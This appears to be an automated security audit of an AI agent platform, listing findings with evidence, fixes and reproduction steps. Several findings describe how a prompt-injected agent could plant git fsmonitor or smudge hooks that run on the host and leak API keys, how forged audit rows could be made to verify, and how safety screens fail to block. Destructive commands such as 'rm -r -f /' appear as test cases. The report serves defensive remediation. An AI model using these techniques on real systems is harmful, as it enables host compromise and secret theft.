| W1-85 | **high** | Raised (finder cited evidence; skeptic pass not run) | sandbox/kubernetes | `packages/maverick-core/maverick/sandbox/kubernetes.py:110` | Kubernetes sandbox pod mounts the namespace ServiceAccount token (no automountServiceAccountToken:false, no seccomp, no read-only rootfs) | In _pod_overrides add "automountServiceAccountToken": False and "enableServiceLinks": False at spec level, "seccompProfile": {"type": "RuntimeDefault"} in the pod securityContext, and "readOnlyRootFilesystem": True plus an emptyDir at /tmp in the container. Add a unit test asserting these keys appear in the --overrides JSON. | S |
| W1-86 | **high** | Raised (finder cited evidence; skeptic pass not run) | sandbox/kubernetes | `packages/maverick-core/maverick/sandbox/kubernetes.py:4` | Kubernetes backend never transfers the workspace into the pod despite its docstring (emptyDir + kubectl cp) — commands run against an empty directory | Either implement the transfer (create the pod with `sleep`, `kubectl cp <workdir> pod:/workspaces/repo`, `kubectl exec`, `kubectl cp` back for mutated files) or make exec() fail closed with an explicit 'workspace not mounted' error and label the backend experimental in README/FEATURES/wizard, as was done for Firecracker. Add a test asserting the workspace contents are visible to the pod command (fake kubectl). | M |
| W2-33 | **high** | Confirmed (hand spot-check at close-out) | shield/builtin_rules | `packages/maverick-shield/maverick_shield/builtin_rules.py:293` | Advertised rm -rf / and recursive chmod/chown rules bypassed by splitting the flags | Rewrite rm_rf_root to tolerate multiple flag groups, e.g. match `rm(\s+-[a-z]+)*` where the union of flag chars includes both r and f, then a root target; same for chmod/chown -R. Add corpus cases `rm -r -f /`, `rm -f -r /`, `chmod -c -R / `. Better: route destructive-shell detection through a small argv tokenizer rather than surface regex. | M |
| W1-110 | **high** | Raised (finder cited evidence; skeptic pass not run) | tools/connectors | `packages/maverick-core/maverick/tools/asana_tool.py:203` | Hand-written connectors interpolate unencoded model-supplied IDs into API paths; dot-segments reach arbitrary endpoints (incl. writes) with the operator's credential | Add a shared `_path_segment(value)` helper in tools/__init__.py (urllib.parse.quote(value, safe='') plus a reject of '.', '..' and empty) and apply it to every interpolated id/slug/entity in asana, bitbucket, clickup, cloudflare, confluence, dynamics (and any g-z sibling with the same shape); add a regression test that `../` in each id yields ERROR rather than a request. | S |
| W1-111 | **high** | Raised (finder cited evidence; skeptic pass not run) | tools/database | `packages/maverick-core/maverick/tools/database_tool.py:168` | `database` tool accepts a model-supplied SQLAlchemy `url` with no scheme/host policy by default, so an agent can open any local SQLite file or any reachable DB server | Default-deny model-supplied `url`: only honor it when a capability allow_hosts is present or an explicit `[tools] database_allow_url_arg = true` knob is set; reject `sqlite:` URLs (or confine file paths to sandbox.workdir); log the effective host on every call. Add wizard/config knob per kernel rule 5. | S |

### Detail

#### W2-1 — Repo-local git config (core.fsmonitor / filter smudge) executes arbitrary commands during host-side git diff — agent- or repo-controlled RCE + secret exfiltration

- **Severity:** critical · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** M · **Found by:** injection-sweep
- **Where:** `packages/maverick-core/maverick/edit_format.py:670`
- **Evidence:**

  ```
  proc = subprocess.run(
      cmd, capture_output=True, timeout=30,
      env={**os.environ, "GIT_LITERAL_PATHSPECS": "1"},
  )   # cmd = ["git","-C",str(workdir),"diff",...,"HEAD"] on the host, full os.environ
  ```
- **Why it matters:** render_diff() runs `git diff HEAD` on the HOST against the agent's workdir with the full, un-scrubbed process environment. Git honours repo-local config: a `core.fsmonitor` hook or a `[filter "x"] smudge` command in the workdir's `.git/config` / `.gitattributes` is executed by git during diff/reset/worktree operations. The workdir is attacker-influenced: (a) the agent's own write_file can create `.git/config` — the `_is_dotgit_path` block in tools/fs.py only fires in opaque BENCHMARK mode (MAVERICK_BENCHMARK_OPAQUE+MAVERICK_CODING_MODE), so in normal operation a prompt-injected agent writes it freely (I confirmed write_file wrote `.git/config` with an fsmonitor line); (b) github_app.process_issue clones an untrusted external repo and the agent loop then renders its diff. orchestrator.py added `_git_metadata_may_execute_filters()` as a guard, but render_diff (called from agent.py:1867 and agent.py:4426), reviewer.get_diff (reviewer.py:159, no env= at all → inherits every secret) and coding_mode candidate eval (worktree add + reset --hard at coding_mode.py:2040/2105) have ZERO references to that guard. I PROVED it: pointing render_diff and get_diff at a repo whose `.git/config` set `core.fsmonitor` to a shell script caused the script to run and write `sk-ant-TESTLEAK` (the ANTHROPIC_API_KEY I set) to disk. This is arbitrary host code execution outside the sandbox plus provider-key exfiltration in the default configuration.
- **Recommendation:** Route every host-side git invocation in edit_format.py, reviewer.py and coding_mode.py through the same hardening orchestrator.py already uses: (1) run under `_git_env_without_user_config()` (GIT_CONFIG_GLOBAL/SYSTEM=devnull, GIT_CONFIG_COUNT overrides for core.fsmonitor=false) AND scrub_env() so no provider secret is in the child env; (2) call `_git_metadata_may_execute_filters(wd)` and refuse when true; (3) unconditionally block writes under `.git/` in tools/fs.py (not only in opaque benchmark mode). Add `-c core.fsmonitor=false -c core.hooksPath=/dev/null` to the argv as belt-and-suspenders.
- **Spot-check:** Hand re-read at close-out: edit_format.py runs `git diff` via subprocess.run with env={**os.environ, GIT_LITERAL_PATHSPECS=1} and no -c core.fsmonitor=false / hooksPath guard; the finder also executed the fsmonitor payload end-to-end and observed ANTHROPIC_API_KEY exfiltrated.
- **How to confirm:** cd to a scratch git repo, `git config core.fsmonitor "$PWD/hook.sh"` where hook.sh writes $ANTHROPIC_API_KEY to a file and echoes '/', then `ANTHROPIC_API_KEY=x python3 -c 'from pathlib import Path; from maverick.edit_format import render_diff; render_diff(Path("<repo>"))'` and observe the hook ran and the key was written. Repeat with maverick.reviewer.get_diff. grep -c _git_metadata_may_execute_filters edit_format.py reviewer.py coding_mode.py (=0).

#### W4-29 — A delivery that fails after the conversation reservation permanently blocks every later turn of that conversation (no abandon/expiry path)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** reliability · **Effort:** M · **Found by:** suite-ai
- **Where:** `packages/maverick-core/maverick/ai_evidence_gateway.py:1365`
- **Evidence:**

  ```
  raise ConversationOrderError(
                  "an earlier delivery in this conversation is not committed"
              )
  ```
- **Why it matters:** _deliver_text_locked reserves the conversation (line 2335 `sequence, parent_hash, disclosure_due, issued_at = (_conversation_reservation(...)`) and only then calls _render_text and _sign_event; neither is wrapped in a rollback, and _complete_conversation is the only thing that clears `pending`. If signing fails (signer refusal, segment/capacity error, disk full, process crash) the `pending` block stays. Any subsequent deliver_text for that conversation_id with a different idempotency key raises ConversationOrderError forever; the only recovery is re-sending the exact same idempotency key (clients that mint a fresh key per attempt never recover). No code path expires or abandons a stale reservation (_reserved_issued_at only validates the timestamp) and no test covers ConversationOrderError. Reproduced with a scratch pytest: first turn OK; monkeypatched _sign_event raises for turn-2; 'turn-2-retry' and 'turn-3' both raise ConversationOrderError.
- **Recommendation:** Either (a) wrap render+sign in try/except and clear the reservation (compare-and-swap on the same receipt_id) on failure, or (b) add a bounded reservation TTL: when `pending.issued_at` is older than N seconds and no signed row exists for pending.receipt_id in the ledger, allow a new reservation to supersede it (recording the abandoned receipt_id in the audit trail). Add an operator API to abandon a pending reservation, and a test for the failure-then-new-key sequence.
- **How to confirm:** python3 -m pytest -q /tmp/claude-0/-home-user-Lightwork/077d0601-5e34-50a4-85b5-07b88142b155/scratchpad/audit/work/suite-ai/test_repro_stuck_conversation.py (passes = bug reproduced). Also grep -n 'ConversationOrderError' packages/maverick-core/tests/test_ai_evidence_gateway.py returns nothing.

#### W4-28 — Segmented receipt ledger re-verifies the whole active segment on every append (O(n) per delivery, measured 64 ms -> 237 ms and climbing)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** performance · **Effort:** M · **Found by:** suite-ai
- **Where:** `packages/maverick-core/maverick/ai_evidence_ledger.py:1780`
- **Evidence:**

  ```
  signer = AuditSigner(segment_path)
              if not signer.write(dict(event)):
                  raise SegmentedLedgerError("audit signer refused evidence")
              line_number, signed = self._verify_file(segment_path)
  ```
- **Why it matters:** _verify_file streams _iter_verified_rows over the entire active segment (JSON parse + SHA-256 + Ed25519 verify of every row) after each single-row append, under the cross-process delivery lock, while the default segment is 4,096 rows (_DEFAULT_RECEIPT_SEGMENT_ROWS in ai_evidence_gateway.py:223) and may be configured up to 1,000,000. Scratch benchmark on this box: append #100 = 64 ms, #500 = 82 ms, #1000 = 212 ms, #1500 = 237 ms; 1,500 appends took 212 s (~7 receipts/s and falling). deliver_text (called from orchestrator.py:1162/1773 and blackboard.py when [evidence_gateway] is enabled) is fully serialised by _DELIVERY_LOCK + cross_process_lock, so this bounds the platform's governed-output throughput and grows quadratically within each segment. The signed-state tail probe in _quick_physical_matches already exists precisely to avoid this cost on the state path.
- **Recommendation:** After AuditSigner.write, verify only the newly appended tail: read the last line, check prev_hash == state.active_segment_tip, hash/signature of that one row, and use the known row count from the authenticated state (+1) instead of _verify_file(segment_path). Keep full-segment verification for rebuild/verify_integrity paths. Add a regression test asserting append cost is independent of segment size (e.g. time 50 appends at row 10 vs row 3,000).
- **How to confirm:** Run the scratch benchmark: set MAVERICK_HOME to a temp dir, construct SegmentedReceiptLedger(path, tenant_id='t', segment_rows=4096) and time ledger.append() at rows 100/500/1000/1500 (script at /tmp/claude-0/-home-user-Lightwork/077d0601-5e34-50a4-85b5-07b88142b155/scratchpad/audit/work/suite-ai/bench_ledger.py). Read _verify_file (line 672) -> _iter_verified_rows (line 233) to confirm it walks every row.

#### W2-90 — `maverick airgap check` can report 'clean' while the process-wide egress guard is off: it checks [egress] deny=['*'] (enforced by ~15 modules) but never [enterprise] mode, which is what egress_guard actually enforces

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** network-egress
- **Where:** `packages/maverick-core/maverick/air_gap.py:88`
- **Evidence:**

  ```
  def _audit_egress(config: dict) -> list[str]:
      egress = config.get("egress") or {}
      deny = egress.get("deny") or []
      if "*" not in deny:
          return ['egress is not deny-all — set [egress] deny = ["*"] to block '
                  "all outbound hosts"]
      return []
  ```
- **Why it matters:** The runtime egress chokepoint (egress_guard._denied -> enterprise.egress_permitted, enterprise.py:542-551) consults only enterprise_enabled() plus [enterprise] allowed_hosts; it never reads the [egress]/[tenancy.egress] plane. That plane is honoured only by callers of tenant.egress.egress_allowed (grep: http_fetch, data_map, sidecar, ai_inventory and ~11 others) — none of the ~80 httpx connectors in the census, none of the provider SDKs. So a config with all-local models, [egress] deny=['*'], a network-off sandbox and NO [enterprise] mode passes the audit (test_air_gap.py:27-28 asserts exactly this shape is clean) while every SaaS connector, web_search and the knowledge embedder can still reach the internet. The docstring (lines 12-14) says the tool 'verifies the deployment is actually configured for' the runtime enforcement; it verifies the wrong knob. ADVERSARY_COUNCIL #3 fixed provider-name trust but this second false-clean path remains.
- **Recommendation:** Add a violation when enterprise mode is not on for the audited config (config['enterprise']['mode'] is not True and MAVERICK_ENTERPRISE not truthy and no compliance floor requiring FLOOR_EGRESS_LOCK), and when [enterprise] allowed_hosts is non-empty; alternatively make egress_guard._denied also apply tenant.egress.host_allowed so [egress] deny=['*'] is enforced at the seam. Update test_air_gap.py fixtures accordingly.
- **Prior report:** ADVERSARY_COUNCIL_REVIEW.md #3 'airgap check trusts the provider name, not the resolved URL' (provider part fixed; enterprise-mode/egress-plane mismatch not covered)
- **How to confirm:** python3 -c "from maverick.air_gap import audit; print(audit(config={'models':{r:'ollama:llama3' for r in ('planner','coder','reviewer','router','summarizer')},'egress':{'deny':['*']},'sandbox':{'backend':'docker','allow_network':False}}))" -> clean=True with no [enterprise] section; then read enterprise.py:542-551 and egress_guard.py:186-190: neither consults tenant.egress.

#### W4-59 — assessment.list_saved() crashes once the sibling assessments.py register exists in the same data directory

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** S · **Found by:** suite-grc-security
- **Where:** `packages/maverick-core/maverick/assessment.py:4996`
- **Evidence:**

  ```
  for p in d.glob("*.json"):
          if not _ASSESSMENT_ID_RE.fullmatch(p.stem):
              continue
          data = _load_saved_raw(p.stem)
  ```
- **Why it matters:** assessment.py (questionnaire assessments) and assessments.py (governance-subject register) both live in data_dir("assessments"). assessments.py writes register.json (assessments.py:780) and reads operator-dropped templates.json (assessments.py:682). Both stems match _ASSESSMENT_ID_RE, so list_saved()/list_saved_heads()/_iter_saved_raw() load them as assessment records and _read_saved_path_unlocked raises AssessmentStateError('assessment record identity is invalid') because record['id'] != stem. Reproduced in a scratch MAVERICK_HOME: after writing a schema-v2 register.json, assessment.list_saved() and list_saved_heads() raise; assessment_memory.similar() silently returns [] (it swallows the error). Dashboard callers at api.py:828, 3248, 3993 do not catch AssessmentStateError, so every assessment listing/board/transfer-flow endpoint 500s for any tenant that has used both features (the governance register is written by POST /api/v1/assessments/... refresh/review and by the scheduled assess sweep once entries exist).
- **Recommendation:** Give assessments.py its own subdirectory (e.g. data_dir("assessment_register")) or reserve the stems 'register' and 'templates' in assessment.py's glob (skip them explicitly). Additionally make list_saved() skip-and-log a record whose id does not match its filename instead of raising, so one foreign/corrupt file cannot take down every listing endpoint. Add a regression test that writes register.json and templates.json into the shared dir and asserts list_saved() still works.
- **How to confirm:** MAVERICK_HOME=/tmp/x MAVERICK_ENCRYPT_AT_REST=0 python3 -c "from maverick.paths import data_dir; import json; d=data_dir('assessments'); d.mkdir(parents=True,exist_ok=True); (d/'register.json').write_text(json.dumps({'schema_version':2,'revision':1,'assessments':{}})); from maverick import assessment; print(assessment.list_saved())" -> raises AssessmentStateError: assessment record identity is invalid

#### W2-46 — Audit signing key is a general-purpose signing oracle: detached-digest and federation-envelope signatures are byte-compatible with audit rows, so forged rows verify clean

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** M · **Found by:** crypto-secrets
- **Where:** `packages/maverick-core/maverick/audit/signing.py:345`
- **Evidence:**

  ```
  "signature": signer.sign(bytes.fromhex(digest_hex)).hex(),
  ```
- **Why it matters:** AuditSigner signs `bytes.fromhex(row_hash)` where row_hash = sha256(json.dumps(payload, sort_keys=True, default=str)) (signing.py:893). sign_detached_digest() signs ANY caller-supplied 32-byte digest with the same key and no domain prefix (line 345), and federation_envelope.sign_envelope() signs sha256 of the identical canonical-JSON form (federation_envelope.py:132,187). Scratch proof: build a forged row dict with prev_hash=<chain tip> and key_id, hash it exactly as verify_chain does, obtain the signature from sign_detached_digest() (or embed prev_hash in a federation payload and sign_envelope it), append it to the day-file -> verify_chain() returns [] for both forgeries. Anyone who can drive those entry points (dashboard binder export api.py:3978 signs server-built digests; federation/marketplace/channel exports; any in-process plugin/tool) plus append to the audit file mints chain-valid rows WITHOUT ever touching the private key. This specifically defeats the off-host/KMS custody story (the tamper-evidence claim in proof_guarantees is gated on active_key_is_offhost) because the HSM-held key still signs arbitrary digests on request. approval_signing.py already uses a domain-separated prefix ('maverick-approval-v1') and shows the intended pattern.
- **Recommendation:** Domain-separate every non-row use of the audit key: sign_detached_digest should sign b'maverick-detached-digest/v1\x00'+digest (and verifiers must expect it); sign_envelope should sign a 'maverick-federation-envelope/v1' prefixed message; ideally AuditSigner rows should also sign a versioned prefix + hash (new key_id/format version so old rows keep verifying). Add a regression test that a detached signature never verifies as an audit row.
- **How to confirm:** python3 /tmp/claude-0/-home-user-Lightwork/077d0601-5e34-50a4-85b5-07b88142b155/scratchpad/audit/work/crypto-secrets/forge_row.py -> prints 'after detached-digest forge, verify_chain -> []' and 'after envelope forge, verify_chain -> []'.

#### W1-45 — DR backup archive bundles the at-rest encryption key next to the sealed world.db

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** S · **Found by:** world-model-data
- **Where:** `packages/maverick-core/maverick/backup.py:664`
- **Evidence:**

  ```
  for source in sorted(root.rglob("*")):
          relative = source.relative_to(root)
          if _excluded_from_snapshot(relative):
              continue
  ```
- **Why it matters:** _stage() snapshots every file under the data root and the only exclusions are backups/, .restore-transactions, -wal/-shm/.tmp. crypto_at_rest.py:79 pins the at-rest key to data_dir("keys", "at_rest.key") (and the rotation keyring keys/at_rest.d/*.key, plus audit signing keys) inside that same root, so every `maverick backup create` / `maverick client export` tarball carries the AES-256-GCM key that decrypts the sealed columns it contains. The archive is gzip, not encrypted; the HMAC manifest proves integrity only. Anyone who obtains the backup (offsite copy, S3 bucket, standby host, a DSAR export handed to a subject) gets plaintext-equivalent access, which nullifies the 'encryption at rest' posture the product sells for GDPR Art.32/HIPAA. docs/enterprise/deployment-playbook.md:72-73 warns to 'never place [a key] in an archive' and docs/encryption.md:91-94 tells operators to escrow the key separately -- the code does the opposite. Proved on this box: members ['manifest.json','data','data/keys','data/keys/at_rest.key','data/world.db','data/world.db.lock'].
- **Recommendation:** Exclude `keys/` (at_rest.key, at_rest.d/, audit signing keys) from _excluded_from_snapshot() by default and add an explicit `--include-keys` flag that prints a loud warning; better, seal the whole payload (or the manifest-listed sensitive files) under a backup-specific key derived from MAVERICK_BACKUP_SIGNING_KEY so the archive is confidential as well as authenticated. Document that key escrow is a separate step and add a test asserting no *.key member appears in a default archive.
- **How to confirm:** MAVERICK_HOME=/tmp/x python3 -c "from maverick.world_model import WorldModel; w=WorldModel(); w.create_goal('s','d'); w.close(); from maverick.backup import create_backup; import tarfile; p=create_backup(allow_unsigned=True); print([n for n in tarfile.open(p).getnames() if n.endswith('.key')])" -> prints ['data/keys/at_rest.key'].

#### W1-51 — restore_backup has no live-process guard: restoring while the dashboard/agent holds world.db open silently loses every subsequent write

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** reliability · **Effort:** M · **Found by:** world-model-data
- **Where:** `packages/maverick-core/maverick/backup.py:1161`
- **Evidence:**

  ```
  lock_target = root / _RESTORE_LOCK_TARGET
              with file_lock.cross_process_lock(lock_target, strict=True):
                  _recover_transactions(root, allow_unsigned=allow_unsigned)
                  _apply_transaction(
  ```
- **Why it matters:** Restore locks only its own `.restore-transaction` sentinel; WorldModel takes the per-world lock only during __init__ and then keeps a plain sqlite3 connection open. _publish_staged_file does os.replace() (backup.py:968), so a running process keeps writing to the old, now-unlinked inode while its per-thread reader connections (opened lazily, world_model.py:1192-1213) open the NEW file. Reproduced: open a WorldModel, restore a backup, create_goal on the live handle -> the same handle's get_goal returns None and a fresh open after the process exits also lacks the row: the write is gone and the process is split-brained until restart. Neither `maverick backup restore` (cli/_trust_groups.py:340-350) nor docs/operations.md tells the operator to stop services first. ADVERSARY_COUNCIL #17 (crash consistency) is now addressed by the journal; this concurrent-use hazard is distinct and unaddressed.
- **Recommendation:** Before applying, take the world's own cross_process_lock(world.db) and refuse when it is held / when a WAL or SHM sidecar exists with recent mtime, or add an explicit `--i-stopped-the-service` acknowledgement; at minimum document 'stop maverick serve / dashboard before restore' in the CLI help and operations.md, and have WorldModel detect inode change on its connection (fstat vs stat) and reopen.
- **How to confirm:** MAVERICK_HOME=/tmp/r MAVERICK_ENCRYPT_AT_REST=0 python3 - <<'EOF'
from maverick.world_model import WorldModel; from maverick.backup import create_backup, restore_backup
w=WorldModel(); w.create_goal('a'); p=create_backup(allow_unsigned=True); live=WorldModel(); restore_backup(p, allow_unsigned=True); g=live.create_goal('after'); print(live.get_goal(g)); live.close(); print(WorldModel().get_goal(g))
EOF
-> None, None

#### W2-4 — coding_mode candidate evaluation runs `git worktree add` / `reset --hard` on the host with no filter guard or env scrub

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** security · **Effort:** M · **Found by:** injection-sweep
- **Where:** `packages/maverick-core/maverick/coding_mode.py:2040`
- **Evidence:**

  ```
  proc = _subprocess.run(
      ["git", "-C", str(workdir), "worktree", "add", "--detach", str(wt_path), "HEAD"],
      capture_output=True, timeout=60,
  )   # later: git apply / reset --hard / clean -fd, all host, no env=
  ```
- **Why it matters:** Best-of-N candidate evaluation performs `git worktree add`, `git apply`, `git reset --hard HEAD` and `git clean -fd` directly on the host workdir with default environment and no `_git_metadata_may_execute_filters` check. I verified with a PoC that a repo-local `[filter "x"] smudge` command executes during `git worktree add` and `git reset --hard` (git checks out files → runs the smudge filter), and that `core.hooksPath` override does NOT suppress filter/fsmonitor execution. This is the same host-RCE class as finding #1 on a second, independently-reachable code path (any coding run with >1 candidate).
- **Recommendation:** Apply the orchestrator hardening (filter-metadata guard + scrubbed, config-neutralised env) to every git call in _evaluate_candidate, or perform candidate application through sandbox.exec on a non-host backend. At minimum add `-c core.fsmonitor=false` and refuse when _git_metadata_may_execute_filters(workdir) is true.
- **How to confirm:** PoC: in a scratch repo set `git config filter.evil.smudge <script>` and `echo '* filter=evil' > .gitattributes` && commit, then `git -c core.hooksPath=/tmp/h worktree add --detach ../wt HEAD` — the smudge script runs. coding_mode.py:2040/2052/2105 have no env= and no filter guard.

#### W2-2 — render_diff / get_diff leak the full host environment (provider API keys) into git subprocesses

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** S · **Found by:** injection-sweep
- **Where:** `packages/maverick-core/maverick/reviewer.py:159`
- **Evidence:**

  ```
  proc = subprocess.run(
      ["git", "-C", str(workdir), "-c", "diff.external=", ... "diff", "--no-ext-diff", "--no-textconv", "HEAD"],
      capture_output=True, text=True, timeout=10,
  )   # no env= → inherits ANTHROPIC_API_KEY, STRIPE_API_KEY, etc.
  ```
- **Why it matters:** Independently of the fsmonitor hook vector, these host git calls inherit the entire process environment. The sandbox layer deliberately scrubs ~70 secret env vars before any model-driven shell (sandbox/local.py scrub_env docstring), precisely because agent-reachable child processes must not see provider keys. reviewer.get_diff passes no env= at all and edit_format.render_diff passes {**os.environ,...}; a git filter/textconv/pager helper the workdir can define (or any diff driver git spawns) runs with those secrets in scope. This is the missing-scrub half of the RCE finding and is worth fixing even where the hook guard is added.
- **Recommendation:** Pass `env=scrub_env()` (or scrub_child_env()) to every host git subprocess in reviewer.py and edit_format.py, matching tools/git_advanced.py and tools/preview_diff.py which already scrub. Set GIT_PAGER="" and GIT_CONFIG_GLOBAL/SYSTEM=os.devnull as those helpers do.
- **Spot-check:** Hand re-read: reviewer.get_diff calls subprocess.run([...git... diff...]) with no env argument, so the child inherits the full host environment including provider keys.
- **How to confirm:** grep -n 'env=' packages/maverick-core/maverick/reviewer.py (none on the get_diff subprocess) and packages/maverick-core/maverick/edit_format.py (uses {**os.environ,...} at 646/658/672). Compare to tools/git_advanced.py:70 which uses scrub_env().

#### W4-1 — unified_audit_records raises permanently for any tenant that has unlinked a profile (Operating Record capture breaks)

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** S · **Found by:** suite-consent
- **Where:** `packages/maverick-core/maverick/consent_preferences.py:3721`
- **Evidence:**

  ```
  actions = {
              "profile.created": "record_created",
              "profile.linked": "relationship_changed",
              "profile.identifier_changed": "record_updated",
              "profile.subject_deleted": "record_deleted",
  ```
- **Why it matters:** unlink_profile writes an outbox event with event_type="profile.unlinked" (line 1527) but the unified-audit action map has no entry for it, so unified_audit_records() raises "stored consent outbox event type is unsupported" (line 3739). The outbox is immutable (no-update/no-delete triggers), so once a tenant performs one unlink its unified audit export is broken forever. stock_suite_audit_capture.py:142 consumes this method, so the platform-level Operating Record / signed audit capture for the consent suite silently fails for that tenant. Reproduced by scratch script: create/link/unlink -> ConsentPreferencesError.
- **Recommendation:** Add "profile.unlinked": "relationship_changed" (or a dedicated action) to the actions map in unified_audit_records; add a regression test that links, unlinks, then calls unified_audit_records. Consider making the map a module constant shared with _outbox event_type validation so new outbox event types cannot be added without an audit mapping.
- **How to confirm:** python3 - <<'EOF'
import tempfile,hashlib,time; from pathlib import Path; from maverick.consent_preferences import *
s=ConsentPreferenceStore(Path(tempfile.mkdtemp())/'p.sqlite3'); T='t'; H=lambda x: hashlib.sha256(x.encode()).hexdigest()
s.create_profile(T,'k','known',H('k'),'ik'); s.create_profile(T,'a','anonymous',H('a'),'ia')
s.link_profiles(T,'k','a',expected_known_revision=0,expected_anonymous_revision=0,idempotency_key='il')
s.unlink_profile(T,'a',expected_anonymous_revision=1,expected_known_revision=1,expected_link_revision=1,idempotency_key='iu',identity_evidence_sha256=H('ie'),audit_evidence_sha256=H('ae'),actor_sha256=H('ac'),reason_sha256=H('r'),retention_until=time.time()+86400)
s.unified_audit_records(T)
EOF  -> raises ConsentPreferencesError

#### W2-32 — External-agent/federation shield screen never blocks: verdict.blocked read on a ShieldVerdict that has no such attribute

- **Severity:** high · **Status:** Confirmed (hand spot-check at close-out) · **Category:** security · **Effort:** S · **Found by:** shield-safety
- **Where:** `packages/maverick-core/maverick/external_agents.py:1053`
- **Evidence:**

  ```
  verdict = shield.scan_input(str(detail)[:_MAX_TEXT])
              if getattr(verdict, "blocked", False):
                  return (_deny_and_count(agent_id, tool, "shield", ...)
  ```
- **Why it matters:** ShieldVerdict exposes `allowed`, not `blocked` (guard.py:91-97 — fields are allowed/severity/reasons/raw/scan_error). `getattr(verdict, "blocked", False)` therefore ALWAYS evaluates False, so on the external-agent action-detail screen (line 1053), the request-payload screen (line 1421) and the inbound-content sanitizer (line 291) a Shield BLOCK verdict is silently ignored — the payload is admitted. These are the external/federation inbound paths the ADVERSARY_COUNCIL praised as fail-closed. The deterministic injection_markers screen still runs first, so it is not a total bypass, but the Shield rule pack (rm -rf, exfil, jailbreak, operator constitution) is defeated on exactly the untrusted cross-boundary surface it exists to guard. Confirmed at runtime: hasattr(ShieldVerdict.block('high','x'),'blocked') is False.
- **Recommendation:** Replace `getattr(verdict, "blocked", False)` with `not getattr(verdict, "allowed", True)` at external_agents.py:291, 1053, 1421 (and audit any other `.blocked` reads). Add a unit test that feeds a known-blocking payload through _sanitize/the action gate and asserts denial. Consider giving ShieldVerdict a `blocked` property alias to make the two spellings equivalent and prevent recurrence.
- **Spot-check:** Hand re-read: external_agents.py reads getattr(verdict, 'blocked', False); maverick_shield.guard.ShieldVerdict has fields allowed/severity/reasons/raw/scan_error and no `blocked`, so the screen can never deny.
- **How to confirm:** python3 -c "from maverick_shield import ShieldVerdict; print(hasattr(ShieldVerdict.block('high','x'),'blocked'))" prints False; then read external_agents.py:291,1053,1421.

#### W1-2 — Budget exhaustion and client-side 400s trip the provider circuit breaker, fast-failing every other goal/tenant in the process for 30s

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** reliability · **Effort:** S · **Found by:** llm-providers
- **Where:** `packages/maverick-core/maverick/llm.py:1450`
- **Evidence:**

  ```
  except Exception:
              _err = True
              raise
          finally:
              ...
              _feed_circuit(provider, _err)
  ```
- **Why it matters:** Since the breaker became enforced (llm.py:1390 _enforce_circuit, closing ADVERSARY_COUNCIL #9) every exception escaping client.complete counts as a provider failure, including BudgetExceeded raised by Budget.record_tokens inside _parse_response (anthropic_provider.py:544-552) after a *successful* API call, UnpricedModelError, and 4xx client errors (context overflow, bad tool schema, 400 from a deprecated param). circuit_breaker.get() defaults to failure_threshold=5, cooldown 30s, keyed only by 'llm:<provider>' (process-global). Proven by scratch run: 5 BudgetExceeded from a fake client -> _circuit_open('anthropic') is True and the 6th call raises CircuitOpen; same with five anthropic.BadRequestError(400). A single fan-out goal that hits its $ cap (N parallel sub-agents each raising BudgetExceeded) therefore takes the Anthropic provider offline for every concurrent goal and tenant served by that dashboard/worker process, and the failover chain treats CircuitOpen as retryable so it will also route those unrelated goals to fallback providers. The breaker also counts asyncio cancellation as *success* (see separate finding).
- **Recommendation:** Feed the breaker only with provider-transport outcomes: classify the exception before _feed_circuit and record a failure only for 429/5xx/timeout/connection classes (reuse retry._is_retryable_status_error / failover_policy.classify_error), never for BudgetExceeded, ModelNotAllowedError, PreflightFailed, EgressBlocked or 4xx. Consider keying the breaker by (provider, base_url/tenant) so one tenant's quota problem cannot open another's circuit.
- **Prior report:** ADVERSARY_COUNCIL_REVIEW.md #9 (observe-only breaker) is now fixed; this is the blast-radius regression introduced by the fix
- **How to confirm:** Scratch reproduction: LLM(model='claude-sonnet-4-6'); llm._get_client=lambda p: FakeClient() where FakeClient.complete raises maverick.budget.BudgetExceeded; call llm.complete 5x catching the error; maverick.llm._circuit_open('anthropic') -> True; a 6th complete() raises maverick.circuit_breaker.CircuitOpen.

#### W1-3 — Catalogued model 'claude-opus-4-8-fast' is a phantom id sent verbatim to the API; fast mode needs speed='fast' + beta header and cannot work

- **Severity:** high · **Status:** Raised (finder cited evidence; skeptic pass not run) · **Category:** correctness · **Effort:** S · **Found by:** llm-providers
- **Where:** `packages/maverick-core/maverick/llm.py:47`
- **Evidence:**

  ```
  MODEL_OPUS_FAST = "claude-opus-4-8-fast"
  ...
      "anthropic":  [MODEL_OPUS, MODEL_OPUS_FAST, MODEL_SONNET, MODEL_HAIKU],
  ```
- **Why it matters:** The Anthropic request builder passes the id straight through (anthropic_provider.py:328 `"model": model or self.DEFAULT_MODEL`); nothing anywhere strips the '-fast' suffix or adds the wire shape fast mode actually requires (client.beta.messages.create with betas=['fast-mode-2026-02-01'] and a top-level speed='fast' parameter, per the Anthropic API reference; there is no 'claude-opus-4-8-fast' model id). The id is exposed in the dashboard picker (MODEL_CATALOG), the installer wizard (apps/installer-cli/maverick_installer/models.py:31 'Opus 4.8, ~2.5x faster output at 2x price ($10/$50)'), the rate card, preflight, and the energy router — so an operator who selects it gets a not_found_error on every call, while the platform advertises and prices it as a working SKU. Existing tests (test_opus_48_models.py, test_pricing_provider.py:345) only assert pricing/cache behaviour, never the request shape.
- **Recommendation:** In AnthropicClient._build_request, map MODEL_OPUS_FAST to model='claude-opus-4-8' + speed='fast' + the fast-mode beta (routing through client.beta.messages), or remove the SKU from MODEL_CATALOG/wizard until implemented. Add a request-shape test that asserts the outbound `model` never contains '-fast'. Note fast mode is unavailable on Bedrock/Vertex/Foundry and has its own rate limit; fall back to standard Opus on 429.
